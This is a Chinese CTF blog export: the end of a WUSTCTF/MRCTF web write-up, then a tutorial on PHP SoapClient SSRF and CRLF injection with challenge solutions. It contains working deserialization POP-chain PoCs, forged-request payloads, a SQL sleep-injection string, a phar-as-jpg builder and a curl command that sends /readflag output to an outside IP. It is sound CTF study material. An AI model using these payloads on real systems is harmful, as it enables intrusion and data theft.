class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">                unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意到wakeup后自然明白反序列化的触发方式了.同时按照LCTF的经验，这里大概率是一个一个双参数函数，即<code>call_user_func</code>+Soap打ssrf。<br>跟一下Typecho_Db类<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/5.PNG" alt></p><p>果不其然有个<code>call_user_func</code>。而且参数都可控，链子结束。所以其实就是个原题魔改了下。当时看到这就没做了。</p><p>然而事情没这么简单。后来发现一个问题。那就是LCTF可以利用session处理器将Soap的序列化数据写到session里，然后<code>call_user_func</code>触发。这里却不行。那就需要把链子再多挖一下.</p><p>注意到之前的结尾提示我们<code>__toString()</code>。全局搜索下toString，跟到\var\Typecho\Db\Query.php下。<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/6.PNG" alt><br>注意到这里，<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>时执行了<code>_adapter</code>的<code>parseSelect()</code>方法。应该可以满足我们触发Soap的条件，即调用不存在方法。<br>梳理完重点后开始构造了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);</span><br><span class="line">&#x3D;&gt;call_user_func(array($adapterName, &#39;isAvailable&#39;))</span><br><span class="line">    &#x3D;&gt; __toString()&#x2F;&#x2F;Typecho_Db_Query</span><br><span class="line">      &#x3D;&gt; $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>只用到两个类,pop链不长（hhh）<br>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For:127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=b92shmac496iqkek97vkuetnn0"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'abc'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'byc404^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$poc = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $poc);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($poc);</span><br></pre></td></tr></table></figure><p>然后触发的地方没找到……原来在/var/Typeecho/Plugin.php里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$_plugins[<span class="string">'activated'</span>][$pluginName] = <span class="keyword">self</span>::$_tmp;</span><br><span class="line">    <span class="keyword">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">"page_admin_action"</span>,<span class="string">"/page_admin"</span>,<span class="string">"HelloWorld_Plugin"</span>,<span class="string">'action'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就尝试提交poc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post: C0incid3nc3&#x3D;TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7czoyNjoiAEhlbGxvV29ybGRfREIAY29pbmNpZGVuY2UiO2E6MTp7czo1OiJoZWxsbyI7TzoxNjoiVHlwZWNob19EYl9RdWVyeSI6Mjp7czoyNjoiAFR5cGVjaG9fRGJfUXVlcnkAX2FkYXB0ZXIiO086MTA6IlNvYXBDbGllbnQiOjU6e3M6MzoidXJpIjtzOjM6ImFiYyI7czo4OiJsb2NhdGlvbiI7czoyNToiaHR0cDovLzEyNy4wLjAuMS9mbGFnLnBocCI7czoxNToiX3N0cmVhbV9jb250ZXh0IjtpOjA7czoxMToiX3VzZXJfYWdlbnQiO3M6Nzk6ImJ5YzQwNA0KWC1Gb3J3YXJkZWQtRm9yOjEyNy4wLjAuMQ0KQ29va2llOiBQSFBTRVNTSUQ9bW9pODU2cXVxcHU2bXV2bWhnYTdrbzdwNTMiO3M6MTM6Il9zb2FwX3ZlcnNpb24iO2k6MTt9czozMDoiAFR5cGVjaG9fRGJfUXVlcnkAX3NxbFByZUJ1aWxkIjthOjE6e3M6NjoiYWN0aW9uIjtzOjY6IlNFTEVDVCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>然后<code>?admin=1</code>访问即可。<br>然后应该是跟LCTF一样，最好payload跟检查flag的PHPSESSID不要用同一个。我看Nepnep师傅们的wp里说直接生成的payload过不去。我反正??????人家特意设定的base64encode根本不存在private特殊字符过不去的问题啊。反正我是可以直接打的,应该没啥问题。<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/7.PNG" alt></p><p>大概这么多，题目毕竟新手题。收获谈不上，没掉链子就算满意了。最后一题也提醒了自己拒绝想当然，链子没写出来就不能空想，实在的poc才是王道。过几天把幽灵猫的总结下。毕竟国际赛上也遇到了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Soap的ssrf/crlf攻击</title>
      <link href="2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/"/>
      <url>2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>这几天在buu上疯狂刷题。突然接触到了一个之前没有注意过的知识点。那就是使用Soap进行ssrf。目前做到的几道题个人觉得还是非常有营养的。那么干脆总结下关于php+Soap的相关知识。</p><a id="more"></a><h1 id="Soap"><a href="#Soap" class="headerlink" title="Soap"></a>Soap</h1><p>SOAP是webService三要素（SOAP、WSDL、UDDI）之一：</p><ul><li><p>WSDL 用来描述如何访问具体的接口。</p></li><li><p>UDDI用来管理，分发，查询webService。</p></li><li><p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p></li></ul><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services<br>这个扩展实现了6个类。其中有三个高级的类： SoapClient、SoapServer 和SoapFault，<br>和三个低级类，它们是 SoapHeader、SoapParam 和 SoapVar。<br>其构造方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure><p>第一个参数是用来指明是否是wsdl模式。通常我们构造时设为null即可。</p><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p><p>这里有趣的地方就在于两点</p><ul><li>SoapClient是php的原生类。且它有一个<code>__call()</code>魔术方法</li><li>SoapClient的第二个参数允许我们自定义User-Agent</li></ul><p>来依次解释下这两个有趣之处<br>1.原生类说明我们不需要刻意去寻找php POPChain中的利用点。因为Soap已经提供给我们一个现成的魔术方法。而只要用Soap,我们就可以达成ssrf，可以打内网.</p><p>2.User-Agent可自定义带来的是CRLF注入的可能。为什么这么说？因为http header里有一个重要的Content-Type为和Content-Length。<br>而User-Agent的http header位置正好在这些之上，所以可以进行覆盖。对于Content-Type，如果我们想要利用CRLF发送post请求，那么要求它为application/x-www-form-urlencode<br>那么此时就可以利用CRLF，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; new SoapClient(null,array(&#39;user_agent&#39;&#x3D;&gt;&quot;test\r\nCookie: PHPSESSID&#x3D;08jl0ttu86a5jgda8cnhjtvq32\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\nContent-Length:45\r\n\r\n</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;nu1ladmin&amp;code&#x3D;470837\r\n\r\n\r\n&quot;,</span><br><span class="line">&#39;location&#39;&#x3D;&gt;$location,</span><br><span class="line">&#39;uri&#39;&#x3D;&gt;$uri));</span><br></pre></td></tr></table></figure><p>CRLF与SSRF，这两个漏洞都可以通过SoapClient达成。</p><h1 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h1><p>干说道理是不够的，这里直接把几天来做到的真题分析下。</p><p> 踩坑： windows下开启SoapClient:<br>SoapClient用到的是php扩展，需要在php.ini启用三个动态链接库</p><ul><li>php_soap.dll</li><li>php_openssl.dll</li><li>php_curl.dll                     </li></ul><p>这里我的ini文本中开始只找到一个未启用的库<code>;extension=php_curl.dll</code>，但是实际上在php的文件夹的ext里应该是可以全部找到的。所以需要把这三个文件名都启用（即去掉开头分号），并令其等于对应的扩展路径，这样就可以使用SoapClient了。</p><p>Linux安装一把梭就好，不必多说。</p><h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>题目源码<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>题目有几个重点，我们先从结果看起。<br>flag在flag.php中，想要读到flag，必然需要从127.0.0.1访问，然后flag会被保存在session值中。显然是个ssrf了。那么我们看看index.php中的代码<br><code>var_dump($_SESSION);</code><br>首先确认session的值会被打印出来。既然如此，那看来我们的目标就是ssrf了。再来看看其他函数需要怎么利用。<br>很唐突的一个<code>$b = &#39;implode&#39;;</code>+<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>以及最后一个<code>call_user_func($b, $a);</code><br>这里b紧接着一个<code>call_user_func</code>看来是可以变量覆盖了。<br>那么如果覆盖了的话，覆盖成什么，又怎么利用呢？<br>这里需要知道一点：</p><ul><li>call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法</li></ul><p>‘假如我们一开始利用f将b覆盖成 <code>call_user_func()</code>，那么在index.php的最后，函数将执行<br><code>calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’))</code><br>由于<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>可控，如果令name=SoapClient，不就成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</span><br></pre></td></tr></table></figure><p>吗？<br>前面提到，如果SoapClient存在<code>__call()</code>魔术方法，调用不存在的方法将直接触发我们所需要的ssrf.<br>那么整个流程的最后一步可以先行构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意的是，这里还用到了我们上面提到的CRLF漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;user_agent&#39; &#x3D;&gt; &quot;byc\r\nCookie: PHPSESSID&#x3D;g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,</span><br></pre></td></tr></table></figure><p>看，只要\r\n，我们就可以控制访问时的Cookie,这样最后生效的flag也会被保存在我们可控的cookie中</p><p>下面要思考的就是，怎么触发反序列化呢？联系到题目中敏感的session存储，自然可以联想到某个不用<code>unserialize</code>也能触发的反序列化漏洞：phpsession处理器引擎不一致导致的反序列化。<br>那么问题就解决了：我们在最开始就令引擎为<code>php_serialize</code>，并将序列化数据存储到session中。然后在第二次才进行ssrf。此时由于处理器重新变回php，将触发反序列化，从而触发ssrf，将flag存储在可控cookie中。最后换cookie访问即可。<br>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A5......</span><br><span class="line">同时post serizliaze_handler&#x3D;php_serialize</span><br><span class="line">这样执行的就是session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)</span><br><span class="line">我们的数据被成功写入session</span><br><span class="line"></span><br><span class="line">2.f&#x3D;extract&amp;name&#x3D;SoapClient</span><br><span class="line">同时post b&#x3D;calluserfunc</span><br><span class="line">这样执行的就是calluserfunc(calluserfunc,array($_session,‘welcome_to_the_lctf2018’))</span><br></pre></td></tr></table></figure><p>最后换cookie访问index.php就能拿到flag了。</p><h2 id="De1CTF-shellshellshell"><a href="#De1CTF-shellshellshell" class="headerlink" title="De1CTF shellshellshell"></a>De1CTF shellshellshell</h2><p>超级麻烦的一道题……<br>可能是因为我懒得写自动化脚本吧。看到赵师傅的wp直接自动化一把梭羡慕不已。<br>这题其他细节我就不讲了，主要重点讲讲中间利用Soap的部分<br>首先题目在登录进去后有个点，这里<code>signature</code>变量可以构造下时间盲注。因为反引号+正则替换的使用不当，导致了可注的地方，于是可以得到管理员的账号密码。<br>大概是这种形式吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#96; or sleep(3) ,1)#</span><br></pre></td></tr></table></figure><p>但是尝试登录时却提示需要从本地登进，这就是说要ssrf了。怎么达成呢?<br>因为我环境懒得重开了，借用下其他师傅的图<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/1.PNG" alt><br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/2.PNG" alt><br>虽然将mood参数转int并addshalshes了，但是后面mood参数在可以注入的signnature参数后面，所以可以通过注入将其直接注释掉，来注入一个我们的恶意序列化对象<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/3.PNG" alt><br>然后调用了一个getcountry()方法，结合我们之前的需求，正好可以使用SoapClient。只要使用Soap构造一个登陆admin的请求，序列化后插入数据库，这里调用不存在方法时就能直接触发<code>__call()</code>进而触发ssrf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/index.php?action=login"</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=4153792'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2'</span>,</span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string.<span class="string">'^^'</span>,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'0x'</span>.bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>稍微解释下要点，我们需要的是ssrf登录admin，那么到时候反序列化触发完了，我们自己登进去，需要的就是一个满足条件的cookie。<br>同时因为要构造的请求必须是登录时包含了admin的账号密码以及验证码的数据，所以需要post请求。这里又一次用到CRLF，来控制Content-Type，Content-Length,达成post请求的条件。</p><p>那么此时最好重开一个浏览器，直接使用新界面的cookie以及算好的验证码放到脚本中，得到16进制的序列化数据。然后在已经登录的位置注入序列化数据。这时会自动跳到index界面，触发序列化。（我直接遇到500,但是不影响）之后再回到原先未登录的地方登录就好了。</p><p>后面的部分不提了，昨天做了我一下午……可以参考赵师傅或者其他师傅的wp<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a><br><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p><h2 id="SUCTF-UploadLabs2"><a href="#SUCTF-UploadLabs2" class="headerlink" title="SUCTF UploadLabs2"></a>SUCTF UploadLabs2</h2><p>这题也是给出源码，然后审计<br>首先是Ad类一个诱人的析构方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>来看看达成条件<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/4.PNG" alt><br>需要ssrf，不用说这里应该又可以想到我们的Soap类了。<br>然后看看有没有可用的方法，很快在File类中找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里ReflectionClass是php中反射类的意思。所以其实wakeup的前两行就是执行了一个实例化对象的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$class &#x3D; new ReflectionClass(&#39;Person&#39;); &#x2F;&#x2F; 建立 Person这个类的反射类  </span><br><span class="line">$instance  &#x3D; $class-&gt;newInstanceArgs($args); &#x2F;&#x2F; 相当于实例化Person 类</span><br></pre></td></tr></table></figure><p>加上那个<code>$a-&gt;check();</code>我们基本确定这里就是用Soap类来构造了。<br>接下来联系func.php中传参实例化File对象的做法，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">      $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">      $file-&gt;getMIME();</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure><p>不难想到使用phar来触发反序列化，这样我们的File类在实例化后，被触发反序列化，调用<code>__wakeup()</code>，只要func是<code>SoapClient</code>就能进行后续的ssrf，达成任意命令执行了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $func=<span class="string">'SoapClient'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name=[</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                <span class="string">'user_agent'</span>=&gt;str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>,<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string.<span class="string">'^^'</span>)</span><br><span class="line">            ,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> File();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">@unlink(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;script language='php'&gt; __HALT_COMPILER(); &lt;/script&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'1.phar'</span>,<span class="string">'1.jpg'</span>);</span><br></pre></td></tr></table></figure><p>同样提几个细节：</p><ul><li>Soap的参数中file_name被设为数组是反射类的一个特点，它接收的是数组参数。</li><li>phar的文件名已经改成jpg了，但是为了过一个文件头的校验还得设定<code>$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;);</code></li><li>post数据除了cmd跟admin外，还要注意Ad在析构前调用的另外一个check()方法中接收的参数，他们都是反射类实例化的<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/5.PNG" 